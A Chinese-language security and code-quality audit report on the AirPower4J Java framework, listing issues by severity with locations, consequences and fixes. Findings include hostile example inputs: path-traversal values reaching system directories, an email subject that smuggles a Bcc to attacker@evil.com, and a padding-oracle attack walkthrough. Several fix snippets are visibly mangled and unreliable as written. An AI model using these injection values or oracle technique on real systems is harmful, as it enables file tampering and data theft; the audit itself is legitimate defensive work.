# AirPower4J 代码审计报告（ISSUE 清单）

> 审计范围：`AirPower4J` 主干（`dev` 分支，HEAD `40d5b672`）全部 11 个子模块、104 个 Java 文件、9395 行代码 + 12 份 POM。
> 审计方式：5 个子代理按模块**全量逐行通读**（非 grep 抽样），主审逐条复验关键结论，并对争议项用 `javap` 读字节码、
`mvn clean compile`、`md5`、本地仓库产物等手段交叉取证。
> 分级：**P0 = 立刻修**（构建中断 / 安全失守 / 静默数据损坏）；**P1 = 尽快修**（功能错误 / 泄漏 / 性能塌方 / 排查困难）；**P2 =
顺手修**（可读性、一致性、文档、潜在风险）。
> 标记约定：✅ = 主审已实证复核；⚠️ = 来自子代理的代码走读结论，主审未逐行复核，建议修复前再看一眼对应代码。

---

## 〇、一页速览

| 等级     | 数量     | 一句话                                                              |
|--------|--------|------------------------------------------------------------------|
| **P0** | **10** | 主干编译不过、鉴权与脱敏形同虚设、令牌/密钥明文进日志、任意文件读写删除、邮件头注入、固定 IV 加密、系统字段被写成 NULL |
| **P1** | **45** | 钩子双执行、内存泄漏、锁不原子、全表加载、CSV 注入、MQTT 完全不可用、工具参数串位、异常被伪装成成功、缓存雪崩……    |
| **P2** | **47** | 注释与实现不符、死代码、命名不统一、依赖治理、缺测试与 CI                                   |

**最该马上做的四件事**

1. 修 `RequestUtil` 的两个常量引用 → **当前主干根本编译不过**（已实测）。
2. 补 `CurdRequestInterceptor` / `RequestFilter` 的自动装配 → **现在所有 CURD 接口等于对匿名用户开放，且 `@Desensitize`
   脱敏完全不执行**。
3. 把 `Authorization` 从默认日志头里去掉 → **每个请求的访问令牌正在明文落盘**。
4. 删掉 `OpenRequest` 里那行 `log.info` → **开放平台的 `appSecret` 每次调用都被明文打进日志**（删一行即可）。

### 风险热力（按模块）

| 模块                 | P0 | P1 | P2 | 主要问题                               |
|--------------------|:--:|:--:|:--:|------------------------------------|
| airpower-api       | 1  | 5  | 9  | 令牌进日志、IP 解析可绕过、配置默认值反直觉            |
| airpower-curd      | 3  | 14 | 12 | 鉴权未注册、钩子双执行、导出链路、事务内 `clear()`     |
| airpower-file      | 2  | 8  | 8  | 路径穿越、任意删除、大小校验失效                   |
| airpower-websocket | 0  | 9  | 10 | 监听器泄漏、并发发送、MQTT 模式不可用              |
| airpower-redis     | 0  | 7  | 7  | 锁不原子、污染全局序列化器、缓存 key 撞号            |
| airpower-ai / open | 3  | 12 | 16 | 签名密钥进日志、固定 IV 加密、类级注解失效、MCP 工具参数串位 |
| airpower-email     | 1  | 0  | 5  | 邮件头注入、HTML 未转义                     |
| airpower-mqtt      | 0  | 4  | 5  | 短连接风暴、broker 会话堆积、无重连              |
| airpower-cookie    | 0  | 1  | 3  | 缺 `SameSite` → CSRF                |
| airpower-exception | 0  | 1  | 3  | `Errors` 是可变全局单例                   |
| 构建 / 工程            | 1  | 1  | 6  | 零测试、发布插件默认签名、依赖坐标废弃                |

---

## 一、P0 —— 必须立刻处理

### P0-1 ✅ 主干编译失败：8 个模块无法构建

- **位置**：`airpower-api/src/main/java/cn/hamm/airpower/api/RequestUtil.java:38`、`:40`、`:131`
- **翻成实际场景**：任何人 clone 下来执行 `mvn clean compile`，在 `airpower-api` 就停下，后面的 8 个模块全部 SKIPPED。
- **后果**：当前 `dev` 分支（`40d5b672 feat(api): 增强 IP 解析安全性并支持可信代理配置`）**发不出去、跑不起来**。

实测输出：

```
[ERROR] .../RequestUtil.java:[38,19] 找不到符号
[ERROR]   符号:   变量 FORWARD
[ERROR]   位置: 类 cn.hamm.airpower.core.constant.HttpConstant.Proxy.Header
[ERROR] .../RequestUtil.java:[40,19] 找不到符号
[ERROR]   符号:   变量 X_REAL_IP
[INFO] airpower-mqtt ... SKIPPED
[INFO] BUILD FAILURE
```

用 `javap` 确认 `airpower-core-7.0.0.jar` 里的 `HttpConstant$Proxy$Header` **只有 5 个常量**（`X_FORWARDED_FOR`、
`PROXY_CLIENT_IP`、`WL_PROXY_CLIENT_IP`、`HTTP_CLIENT_IP`、`HTTP_X_FORWARDED_FOR`），没有 `FORWARD`、没有 `X_REAL_IP`。这是
core 7.0.0（9-23 发布）与 9-29 的代码不同步造成的。

- **修法**（推荐先本地定义，不阻塞主干）：

```java
/** RFC 7239 标准转发头（airpower-core 7.0.0 尚未提供该常量，先本地定义） */
private static final String HEADER_FORWARDED = "Forwarded";
/** Nginx $remote_addr 常用头（同上） */
private static final String HEADER_X_REAL_IP = "X-Real-IP";
```

同时把 `airpower-core.version` 与各模块 `8.0.1` 的版本差（差一个大版本，见 P2-29）在 CI 里做一致性校验，避免再次发生。

---

### P0-2 ✅ 鉴权拦截器从未注册：`@Permission` 形同虚设，脱敏完全不执行

- **位置**：`interceptor/CurdRequestInterceptor.java:38`（只有 `@Component`）、`interceptor/filter/RequestFilter.java:19`（只有
  `@WebFilter`）、`Auto.java:12`（只有 `@AutoConfiguration + @ComponentScan`）
- **翻成实际场景**：业务继承了 `CurdController`，类上写着的 `@Permission(login = true, authorize = true)` **从来没有被执行过
  **。任何人拿一个空 token 调 `POST /user/add`、`POST /user/delete` 都能通过。
- **后果**（逐条验证过）：

| 应有的能力                                        | 实际状态                                                                                                        |
|----------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| 令牌校验                                         | 从不执行                                                                                                        |
| `@Permission` 登录 / 授权判定                      | 从不执行，全部接口对匿名开放                                                                                              |
| `@Desensitize` 脱敏、`@Meta` 字段裁剪               | 从不执行 —— `CurdResponseInterceptor.beforeBodyWrite` 里 `getShareData(REQUEST_METHOD_KEY)` 恒为 `null`，直接走了不脱敏的分支 |
| `@DisableRequestLog` / `@DisableResponseLog` | 从不生效（`method` 恒为 `null`）                                                                                    |
| TraceId 注入                                   | 从不执行                                                                                                        |

全仓搜索 `addInterceptors` / `InterceptorRegistry` / `WebMvcConfigurer` / `FilterRegistrationBean` /
`@ServletComponentScan` **零命中**；`@WebFilter` 在没有 `@ServletComponentScan` 的情况下会被 Spring **静默忽略**。

雪上加霜的是 `airpower-curd/Docs.md:296` 写着：「**如何关闭 `@RequestBody` 重复读取？** 模块已提供 `RequestFilter`，Spring
容器启动后**会自动注册**。」—— 文档把一个不存在的行为描述成了既有功能，开发者据此放心地不注册。

- **修法**（新增自动装配，两处都要）：

```java
package cn.hamm.airpower.curd.config;

@Configuration(proxyBeanMethods = false)
public class CurdWebMvcConfig implements WebMvcConfigurer {

    private final CurdRequestInterceptor curdRequestInterceptor;

    public CurdWebMvcConfig(CurdRequestInterceptor curdRequestInterceptor) {
        this.curdRequestInterceptor = curdRequestInterceptor;
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(curdRequestInterceptor)
                .addPathPatterns("/**")
                .order(Ordered.HIGHEST_PRECEDENCE + 10);
    }

    @Bean
    @ConditionalOnMissingBean(name = "airPowerRequestFilter")
    public FilterRegistrationBean<Filter> airPowerRequestFilter() {
        FilterRegistrationBean<Filter> bean = new FilterRegistrationBean<>();
        bean.setFilter(new RequestFilter());
        bean.addUrlPatterns("/*");
        bean.setName("airPowerRequestFilter");
        // 必须在所有 Spring 拦截器之前，保证请求体可被缓存
        bean.setOrder(Ordered.HIGHEST_PRECEDENCE);
        return bean;
    }
}
```

同时删掉 `RequestFilter` 上的 `@WebFilter`（避免双注册），并订正 `Docs.md:296` 的说法。
⚠️ **注册完必须立刻做 P0-3 的日志脱敏** —— `RequestFilter` 一旦生效，请求体就会被读出来打日志。

---

### P0-3 ✅ 访问令牌明文落进应用日志（默认开启，且关不掉）

- **位置**：`airpower-api/.../config/ApiConfig.java:27`（`requestLog = true`）、`:32`（
  `requestLogHeaders = {AUTHORIZATION, REFERER, USER_AGENT}`）、`airpower-curd/.../CurdResponseInterceptor.java:130-143`（
  `printLog` 无条件执行）、`:173-182`（`getHeaderMap` 无掩码）
- **翻成实际场景**：服务起来后什么都不用配，每个请求的 `Authorization: Bearer eyJ...` 全文都会进日志文件。运维把
  `airpower.api.request-log: false` 和 `response-log: false` 都改成 `false`，**令牌照样进日志** —— 因为 `printLog`
  是无条件调用的，只有 `request` 和 `response` 两个片段受开关保护，`headers` 那一块（`:133`）没有任何开关。
- **后果**：这个令牌是无状态 HMAC 签发的、**没有吊销机制**，拿到就能一直用到过期。任何能看到日志的人（运维、日志平台、备份盘、被拖走的日志包）都能直接冒用。

补充一个连带风险：请求体里含明文密码（`POST /user/add` 的 `password` 字段），但因为 `RequestFilter` 没注册、
`ContentCachingRequestWrapper` 不存在，今天还没被打出来。**一旦 P0-2 修好，密码就会立刻进日志** —— 两个问题必须一起修。

- **修法**：

```java
// ApiConfig.java
/**
 * 输入到日志的请求头列表
 * @apiNote 禁止加入 Authorization / Cookie，框架会原样写入日志，等于把凭据落盘
 */
private String[] requestLogHeaders = {HttpHeaders.REFERER, HttpHeaders.USER_AGENT};
```

```java
// CurdResponseInterceptor.java：消费侧兜底，防止有人又配回去
private static final Set<String> SENSITIVE_HEADERS =
        Set.of("authorization", "cookie", "set-cookie", "proxy-authorization", "x-api-key");

private void printLog(Method method, @NotNull ServerHttpRequest request, String response) {
    boolean logRequest = Boolean.TRUE.equals(apiConfig.getRequestLog());
    boolean logResponse = Boolean.TRUE.equals(apiConfig.getResponseLog());
    if (!logRequest && !logResponse) {
        return;   // 两个开关都关就一条都不打
    }
    ...
}

private @NotNull Map<String, Object> getHeaderMap(@NotNull ServerHttpRequest request) {
    Map<String, Object> mapHeaders = new HashMap<>();
    for (String key : apiConfig.getRequestLogHeaders()) {
        mapHeaders.put(key, SENSITIVE_HEADERS.contains(key.toLowerCase(Locale.ROOT))
                ? "***" : request.getHeaders().getFirst(key));   // 敏感头只记存在性
    }
    return mapHeaders;
}
```

请求体侧对 `password` / `secret` / `token` / `idCard` 这类 key 整体省略或打码。

---

### P0-4 ✅ 上传目录参数零校验 → 任意目录写入

- **位置**：`airpower-file/.../AbstractFilePlatformFactory.java:205-208`、`platform/local/LocalFileHelper.java:36`
- **翻成实际场景**：业务把用户填的"文件分类"直接传给 `upload(file, category)`，用户填 `../../../etc/cron.d`
  ，文件就写到了服务器任意可写目录。
- **后果**：`getUploadDirectory` 只做了「不能为空」一个判断，然后 `fileConfig.getUploadDirectory() + category` 裸拼字符串；
  `LocalFileHelper.save` 又是 `根目录 + directory + fileName` 裸拼交给 `FileUtil.saveFile`。**没有任何「最终路径必须落在根目录内」的兜底
  **。落到 `cron.d` 是提权，落到 `.ssh` 是拿 shell。

- **修法**（入口拦一次、落盘前再拦一次）：

```java
public String getUploadDirectory(String category, boolean isToday) {
    PARAM_INVALID.whenEmpty(category, "文件类别不能为空");
    // 1. 类别只允许安全字符，从源头断掉 ../
    PARAM_INVALID.when(!category.matches("^[A-Za-z0-9_-]{1,64}$"), "文件类别不合法");
    Path base = Path.of(fileConfig.getUploadDirectory()).normalize().toAbsolutePath();
    Path dir = base.resolve(category).normalize().toAbsolutePath();
    // 2. 归一化后必须仍在根目录内
    PARAM_INVALID.when(!dir.startsWith(base), "文件类别不合法");
    return FileUtil.formatDirectory(isToday ? dir + FileUtil.getTodayDirectory() : dir.toString());
}
```

```java
// LocalFileHelper.save 落盘兜底
Path root = Path.of(localFileConfig.getLocalAbsoluteDirectory()).toAbsolutePath().normalize();
Path target = root.resolve(directory).resolve(fileName).normalize();
if(!target.

startsWith(root)){
        throw new

ServiceException("非法的文件路径");
}
```

---

### P0-5 ✅ 文件删除零校验 → 任意文件删除，且失败被吞

- **位置**：`airpower-file/.../platform/local/LocalFileHelper.java:50-57`
- **翻成实际场景**：`delete(path)` 里 `path` 常来自用户提交（前端传 fileId / path）。传 `../../../../etc/hosts` 就把系统文件删了。
- **后果**：任意文件删除；而且删除失败只 `log.error` 不抛，调用方以为删成功了，数据不一致还排查不出来。

- **修法**：

```java

@Override
public void delete(String path) {
    PARAM_INVALID.whenEmpty(path, "文件路径不能为空");
    Path root = Path.of(localFileConfig.getLocalAbsoluteDirectory()).toAbsolutePath().normalize();
    Path target = root.resolve(path).normalize();
    if (!target.startsWith(root)) {
        throw new ServiceException("非法的文件路径");
    }
    try {
        Files.deleteIfExists(target);
    } catch (IOException e) {
        log.error("删除文件失败 path={}", path, e);
        throw new ServiceException("删除文件失败");
    }
}
```

同类问题在 OSS / COS 的 `delete` / `getUrl` 上也存在（`..` 可跨目录删除同 bucket 内他人对象；`getUrl(path, 秒数)`
不封顶可签发十年期公开链接）。建议把路径守卫提到 `AbstractFilePlatformFactory` 里，三个平台统一走。⚠️

---

### P0-6 ✅ 邮件标题未防换行 → 邮件头注入（可夹带 Bcc）

- **位置**：`airpower-email/.../helper/EmailHelper.java:72`（`helper.setSubject(title)`）
- **翻成实际场景**：`title` 传 `"您的验证码\r\nBcc: attacker@evil.com"`，JavaMail 会把它原样写成两行邮件头，于是这封验证码邮件被
  **额外密送给攻击者**。
- **后果**：邮箱任意地址 + 用户验证码同时外流。`To` / `From` 走 `InternetAddress` 严格解析注不进去，*
  *唯一的注入点就是 `Subject`**。

- **修法**：

```java
public final void sendEmail(@NotNull String email, @NotNull String title, @NotNull String content)
        throws MessagingException {
    EMAIL_ERROR.whenNull(javaMailSender, "未配置邮件服务，请检查 spring.mail.*");
    // 邮件头注入防护：去掉所有换行
    String safeTitle = title.replaceAll("[\\r\\n]", " ");
    PARAM_INVALID.when(title.length() > 200, "邮件标题过长");
    MimeMessage message = javaMailSender.createMimeMessage();
    MimeMessageHelper helper = new MimeMessageHelper(message, true, StandardCharsets.UTF_8.name());
    helper.setTo(email);
    helper.setSubject(safeTitle);
    helper.setFrom(mailFrom);
    helper.setText(content, true);
    javaMailSender.send(message);
}
```

---

### P0-7 ✅ `withNull=true` 的更新把系统字段写成 NULL

- **位置**：`airpower-curd/.../base/CurdService.java:812-831`（关键行 `825`、`828`）
- **翻成实际场景**：有人写 `service.updateToDatabase(前端传来的对象, true)`，请求体只带 `{"id":1,"remark":"改一下"}`。代码先把
  `createTime` 置成 null（注释还写着"更新 **不允许**修改创建时间"，意思正好拧了），然后因为 `withNull=true`
  绕过了「用库里旧值打底」的分支，直接把这份残缺对象 merge 回库。
- **后果**（实测代码路径确认）：
    - `create_time` 被 UPDATE 成 NULL —— 它是所有列表默认排序的第二关键字，一列变 NULL 之后列表排序直接错乱；
    - `isDisabled` 被写成 NULL —— `getWithEnable` 的禁用校验随之失效；
    - 其它没传的字段同样全被清空。**全程无异常、无日志、接口返回"修改成功"。**
- **修法**（`getUpdateIgnoreFields` 返回的正好是"值为 null 且未标 `@NullEnable`"的字段，`createTime` / `isDisabled`
  天然被保护，语义不变）：

```java
// 更新 不允许修改创建时间
E existEntity = getById(finalEntity.getId());
E forSave;
if(withNull){
// 以库里的值为底，再覆盖用户显式提交的属性（未提交的保持原值）
forSave =

getEntityInstance();
    BeanUtils.

copyProperties(existEntity, forSave);
    BeanUtils.

copyProperties(finalEntity, forSave, getUpdateIgnoreFields(finalEntity));
        }else{
forSave =

getEntityForUpdate(finalEntity, existEntity);
}
        return

saveToDatabase(forSave);
```

---

### P0-8 ✅ 开放平台 `appSecret` 明文打进 INFO 日志

- **位置**：`airpower-open/.../OpenRequest.java:131-134`
- **代码实证**：

```java
private @NotNull String sign() {
    String source = openApp.getAppSecret() + appKey + version + timestamp + nonce + content;
    //                                              ↑ 密钥在开头
    String sign = DigestUtils.sha1Hex(source);
    log.info("签名比对 {} {} {}", sign, signature, source);
    //                                                 ↑ source 第 0 位就是 appSecret 明文
    return sign;
}
```

- **翻成实际场景**：只要有一个开放接口被调用一次，日志文件里就永久留下 `签名比对 xxx yyy <appSecret>ak_demo1<时间戳>...`
  。变量名叫 `source` 把"它以密钥开头"这件事完全掩盖了。
- **后果**：开放平台的核心密钥全量泄漏到日志系统 —— 而日志通常比数据库访问面更广、保留期更长。任何能看日志的人拿一个
  `appKey` 就能推出密钥，进而以该应用身份调用所有开放接口。
- **修法**（删掉这行；确需审计痕迹就只留指纹）：

```java
private @NotNull String sign() {
    return DigestUtils.sha1Hex(buildSignSource());
}

if(log.

isDebugEnabled()){
        log.

debug("签名校验 appKey={} 期望={} 实际={}",appKey,
      DigestUtils.sha1Hex(sign()).

substring(0,8),
            DigestUtils.

sha1Hex(String.valueOf(signature)).

substring(0,8));
        }
```

---

### P0-9 ✅ 开放接口"加密传输"用固定 IV + 无完整性校验，可被 padding oracle 逐字节解密

- **位置**：`airpower-open/.../OpenRequest.java:98-101`（解密）、`OpenResponse.java:38-39`（加密）；底层 `airpower-core` 的
  `AesUtil`
- **字节码实证**（`javap -c cn.hamm.airpower.core.AesUtil`）：

```
16: ldc  #18   // String AES
22: ldc  #24   // String 0000000000000000     ← IV 硬编码成 16 个 0
30: putfield    #38   // Field iv:[B
34: ldc  #42   // String CBC
40: ldc  #47   // String PKCS5Padding
```

- **翻成实际场景**：AES-CBC + 固定 IV + **无 MAC/无认证标签**。代码还把两种失败分得很清楚：填充不对 → `DECRYPT_DATA_FAIL`
  （5001），填充对了但 JSON 坏了 → `JSON_DECODE_FAIL`（5003）。攻击者拿自己合法的 `appSecret` 当"测量仪器"
  ，构造密文逐字节试探，根据返回的错误码判断最后一个字节猜对没有，**几百次请求就能把别人的密文完整解出来** —— 不需要你的密钥。
- **后果**：开放接口的机密性等于没有；密文可被任意应用解密、篡改。固定 IV 还额外导致**相同明文永远产生相同密文**
  ，业务数据规律（金额、状态、频次）可以直接从密文读出来。
- **附带发现（子代理未覆盖）**：同一段字节码显示 `AesUtil` 用 `ConcurrentHashMap<Integer, Cipher>` 缓存并**复用 `Cipher` 实例
  **（`getCipher` 走 `computeIfAbsent`）。而 `javax.crypto.Cipher` 的 JDK 文档明确写了它**不是线程安全的**，多线程共享会互相破坏内部状态。在
  Web 容器多线程下并发加解密会产生错乱数据甚至异常。→ 记为 P1（J14）。
- **修法**（换 AES-GCM，IV 每次随机，且所有失败路径共用一个错误码）：

```java
/** AES-256-GCM 加密，输出 base64(iv || ciphertext || tag) */
private static String gcmEncrypt(String plainText, byte[] key) {
    try {
        byte[] iv = new byte[12];                       // 96 bit，NIST 推荐长度
        SecureRandom.getInstanceStrong().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
        byte[] enc = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));
        byte[] out = new byte[iv.length + enc.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(enc, 0, out, iv.length, enc.length);
        return Base64.getEncoder().encodeToString(out);
    } catch (GeneralSecurityException e) {
        throw new ServiceException(ENCRYPT_DATA_FAIL);
    }
}

/** 认证失败一律返回同一个错误码，绝不区分"tag 错"和"数据格式错" */
private static String gcmDecrypt(String cipherText, byte[] key) {
    try {
        byte[] all = Base64.getDecoder().decode(cipherText);
        if (all.length <= 12) {
            throw new GeneralSecurityException("cipher too short");
        }
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                new GCMParameterSpec(128, Arrays.copyOfRange(all, 0, 12)));
        return new String(cipher.doFinal(Arrays.copyOfRange(all, 12, all.length)), StandardCharsets.UTF_8);
    } catch (GeneralSecurityException e) {
        throw new ServiceException(DECRYPT_DATA_FAIL);   // 关键：不给攻击者任何可区分信号
    }
}
```

密钥派生也顺手修掉 —— 现在是把 `Base64.decode(appSecret)` 直接当 AES 密钥，等于密钥即密钥：

```java
private static byte[] deriveKey(String appSecret) {
    return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
            .generateSecret(new PBEKeySpec(appSecret.toCharArray(),
                    "airpower-open".getBytes(StandardCharsets.UTF_8), 65536, 256))
            .getEncoded();
}
```

---

### P0-10 ✅ `@OpenApi` 标在类上完全不生效，开放接口裸奔

- **位置**：`airpower-open/.../OpenApiAspect.java:55`（切点）、`OpenApi.java:16`（`@Target`）
- **代码实证**：

```java

@Pointcut("@annotation(cn.hamm.airpower.open.OpenApi)")   // 只在【方法】执行连接点匹配
public void pointCut() {
}

@Target({FIELD, METHOD, TYPE})                              // 却允许标在 类 / 字段 上
```

- **翻成实际场景**：注解声明支持 `TYPE`，`airpower-open/Docs.md:14` 也白纸黑字写着"标注在方法 / **类**上启用开放平台拦截"
  。但 AspectJ 的 `@annotation` 切点只匹配方法上的注解 —— 开发者很自然地在 Controller 类上打一个 `@OpenApi`，**签名校验、nonce
  防重放、IP 白名单一个都不执行，响应也不加密，明文数据直接吐出去**，而且没有任何报错提示你配错了。标在字段上同理，纯装饰。
- **后果**：一个看起来受保护的开放接口实际完全无鉴权，任何人可任意调用并读到内部数据。最典型的"安全控制形同虚设"。
- **修法**（切点补 `@within`，并用最具体方法解析注解）：

```java

@Pointcut("@annotation(cn.hamm.airpower.open.OpenApi) "
        + "|| @within(cn.hamm.airpower.open.OpenApi)")
public void pointCut() {
}

private void validOpenApi(@NotNull ProceedingJoinPoint pjp) {
    Method method = AopUtils.getMostSpecificMethod(
            ((MethodSignature) pjp.getSignature()).getMethod(), pjp.getTarget().getClass());
    OpenApi openApi = method.getAnnotation(OpenApi.class);
    if (Objects.isNull(openApi)) {
        openApi = pjp.getTarget().getClass().getAnnotation(OpenApi.class);
    }
    API_SERVICE_UNSUPPORTED.whenNull(openApi);
}
```

同时把 `@Target` 收窄成只允许 `METHOD`，避免再有人往类/字段上贴（`@Inherited` 对方法级注解没有意义，可去掉）；并订正
`Docs.md:14`。

---

## 二、P1 —— 尽快处理

### A. 鉴权与权限（6 条）

|   #   | 问题                                                    | 位置                                                                               | 后果                                                                                                                      |
|:-----:|-------------------------------------------------------|----------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------|
| A1 ⚠️ | 权限标识「运行时一套、扫描入库另一套」，永远对不上                             | `PermissionUtil.java:89-102` vs `:150-175`                                       | 运行时用 `cn.example.controller.User:queryPage`，`scanPermission` 入库用 `User` / `User_queryPage`。要么全站 403，要么被迫改弱比较导致跨模块越权     |
| A2 ⚠️ | `@Permission` 标在**接口**上被静默忽略                          | `PermissionUtil.java:65`                                                         | `@Inherited` 只对类继承生效、对接口无效。标在公共接口上 → 实现类无注解 → 整个控制器**公开可访问**，且没有任何报错                                                    |
| A3 ✅  | 默认放行：没写 `@Permission` 的接口一律公开                         | `PermissionUtil.java:61-62`、`Access.java:17`                                     | `Access` 两字段默认 `false`，而 `@Permission` 自己默认 `true` —— 同一套体系里两套相反的默认值。漏写注解 = 对外网开放                                       |
| A4 ⚠️ | 权限扫描只认 `@RequestMapping`/`@GetMapping`/`@PostMapping` | `PermissionUtil.java:204-213`                                                    | 写成 `@PutMapping` / `@DeleteMapping` / `@PatchMapping` 的接口在权限表里**没有节点**，管理员永远授不了权，表现为"配了还是 403"                          |
| A5 ✅  | 导出文件无归属校验                                             | `CurdController.java:72`（`@Permission(authorize = false)`）、`RootService.java:47` | 只凭 `fileCode` 取文件，不校验创建者。实际风险有限（32 位随机码不好猜），但属于"用不可猜代替权限校验"的设计软肋                                                        |
| A6 ⚠️ | 身份 Cookie 无 `SameSite`                                | `CookieHelper.java:31-38`                                                        | `jakarta.servlet.http.Cookie` 没有 `setSameSite`，**框架层面就设不了**。靠该 Cookie 鉴权的写操作可被跨站触发（CSRF）。建议改用 Spring 的 `ResponseCookie` |

**A3 的修法**（把默认改成"拒绝"，留全局开关）：

```java
// CurdConfig 新增
/** 无任何 @Permission 声明时的默认行为：true=需要登录 */
private boolean defaultRequireLogin = true;
```

### B. CURD 与数据正确性（9 条）

|   #   | 问题                                      | 位置                                                                                                                                                                                                      | 后果                                                                                                                       |
|:-----:|-----------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|
| B1 ✅  | **所有钩子在控制器和 Service 各执行一次**             | 控制器 `add:89`、`update:105`、`delete:121`、`enable:168`、`disable:151`、`getList:185`、`getPage:201`；Service `add:94`、`update:175`、`delete:140`、`enable:230`、`disable:246`、`getList:262+264`、`getPage:279+284` | ① 子类把同一段副作用逻辑写进 Controller 和 Service 两个同名钩子 → **执行两次**（发两封通知、扣两次库存）；② 更隐蔽：控制器那次对实体的修改会被 Service 那次的返回值**覆盖丢弃**，看着生效了其实没有 |
| B2 ✅  | 每次按 ID 读数据都 `entityManager.clear()`     | `CurdService.java:795`（`getById`）、`:323`（`getForUpdate`）                                                                                                                                                | 同一事务里还没 flush 的修改被静默丢弃（JPA 的 `clear()` 不会 flush），接口照样返回"成功"，排查极难。同时使 `beforeXxx` 钩子对实体的修改全部失效                            |
| B3 ✅  | `getList` 不分页查询无条数上限                    | `CurdService.java:260-265` → `:712-717`                                                                                                                                                                 | 登录用户 POST 一个空 `getList` 就能把整张表拉进内存。`maxPageSize` 只在分页路径生效，这条路完全绕过 → OOM                                                  |
| B4 ✅  | 导出每页都重跑一次全表 `COUNT(*)`，深翻页              | `CurdService.java:1021-1041` → `:728-738`                                                                                                                                                               | 导 100 万条 = 1000 次全表 COUNT + 1000 次深 OFFSET，复杂度平方级；递归深度 = 总页数，还有栈风险                                                       |
| B5 ✅  | `beforeExportQuery` 被调用两次，重置页码则死循环      | `CurdController.java:53` + `CurdService.java:1022`                                                                                                                                                      | 子类若为"从第一页开始导出"写了 `setPageNum(1)`，递归条件永远成立 → **无限循环写 CSV 直到磁盘满**                                                          |
| B6 ✅  | 导出分页大小被静默压回 1000                        | `ExportConfig.java:19`（默认 5000）→ `QueryHelper.java:86-92`                                                                                                                                               | 配置项形同虚设，导出慢 5 倍且毫无提示                                                                                                     |
| B7 ✅  | `getMaybeNull` 吞掉所有异常                   | `CurdService.java:307-313`                                                                                                                                                                              | 数据库连接池耗尽被伪装成"数据不存在"，业务于是插了条重复数据，且没有任何日志                                                                                  |
| B8 ✅  | `getEntityClass` 强转 `ParameterizedType` | `CurdController.java:320-325`、`RootService.java:56-59`（同代码抄两遍）                                                                                                                                          | 写一层泛型基类就 `ClassCastException`；CGLIB 代理过的 Bean 同样崩                                                                        |
| B9 ⚠️ | `@ManyToOne` 过滤用 INNER JOIN             | `QueryHelper.java:176-182`                                                                                                                                                                              | 可空外键为 NULL 的行被**静默过滤掉**（用户以为数据丢了）；JOIN 不去重 + 分页 limit → 列表出现重复行、总数不对                                                     |

**B1 的修法**（只保留服务层一套钩子，控制器删掉重复调用）：

```java
public Json delete(@RequestBody @Validated(WhenIdRequired.class) @NotNull E source) {
    Curd.Delete.checkApiAvailable(this);
    service.delete(source.getId());
    return Json.data(service.getEntityInstance(source.getId()), "删除成功");
}
```

**B3 的修法**（给 `find` 加硬上限）：

```java

@Autowired
private CurdConfig curdConfig;

private @NotNull List<E> find(@Nullable E filter, @Nullable Sort sort, boolean isEquals) {
    return repository.findAll(
            createSpecification(filter, isEquals),
            queryHelper.createSort(sort),
            PageRequest.of(0, curdConfig.getMaxPageSize())   // 硬上限
    );
}
```

**B2 的修法**（把 `clear()` 从读路径挪走，只在显式 API 里清）：

```java
// getById 中删掉 entityManager.clear();
// 确实需要强制回库重读时：
public final @NotNull E getFresh(long id) {
    entityManager.clear();          // 只在这个方法里清
    return afterGet(getById(id));
}
```

### C. 文件模块（6 条）

|   #   | 问题                              | 位置                                                          | 后果                                                                                                  |
|:-----:|---------------------------------|-------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| C1 ✅  | 扩展名白名单**写了但零调用点**               | `AbstractFilePlatformFactory.java:108`（`grep` 全仓仅此一处）       | 业务以为接上了白名单，实际 `evil.svg` / `evil.html` 照传不误                                                         |
| C2 ⚠️ | 大小校验用 `inputStream.available()` | `AbstractFilePlatformFactory.java:148`、`:151`               | `available()` 返回的是"缓冲区里现在能读多少"，网络流返回 0 → **校验永远通过**；且传了 `fileSizeLimit` 回调就直接跳过默认上限                 |
| C3 ✅  | 整个文件 `readAllBytes()` 进堆        | `LocalFileHelper.java:38`、`AliyunOssHelper.java:82`         | 配合 C2 的上限失效，传大流直接 OOM                                                                               |
| C4 ⚠️ | 上传用的流从头到尾没关                     | `AbstractFilePlatformFactory.java:226`、`:258`               | 每次上传漏一个 fd，上传到几千次 `Too many open files`                                                             |
| C5 ✅  | 上传失败把服务器绝对路径回显给前端               | `AbstractFilePlatformFactory.java:159`                      | 用户看到 `/home/static/upload/avatar/2026-09-30/xxx.png (No space left on device)`，等于把目录结构、挂载点、操作系统都告诉他 |
| C6 ⚠️ | OSS / COS 客户端默认走 HTTP 明文        | `AliyunOssHelper.java:107`、`TencentCloudCosHelper.java:113` | SDK 默认 `Protocol.HTTP`，AccessKey 签名和文件内容都明文过网                                                       |

### D. Redis（7 条）

|   #   | 问题                                         | 位置                                           | 后果                                                                                                                    |
|:-----:|--------------------------------------------|----------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| D1 ⚠️ | 释放锁是 `GET` + `DEL` 两步，不是原子的                | `RedisHelper.java:106-114`                   | A 的锁超时后 B 拿到锁，A 判断通过后把 **B 的锁删了** → 两个线程同时改一条数据。必须用 Lua 一步比对+删除                                                       |
| D2 ⚠️ | `getRedisTemplate()` 每次调用都改全局共享的序列化器       | `RedisHelper.java:432-439`、`publish:400-404` | 把 Spring Session、Spring Cache 一起的 `redisTemplate` 四个序列化器换掉且**永不换回** → 别的模块读出来是 String，反序列化直接炸；字段非 volatile，多线程还有可见性问题 |
| D3 ⚠️ | `clearAll("*")` 不加前缀且用 `KEYS`              | `RedisHelper.java:295-303`                   | 只有这一个方法绕过 `getKey()` 前缀。`clearAll("*")` → **这台 Redis 上所有库的数据全没**；`KEYS` 还会把主线程堵几秒                                     |
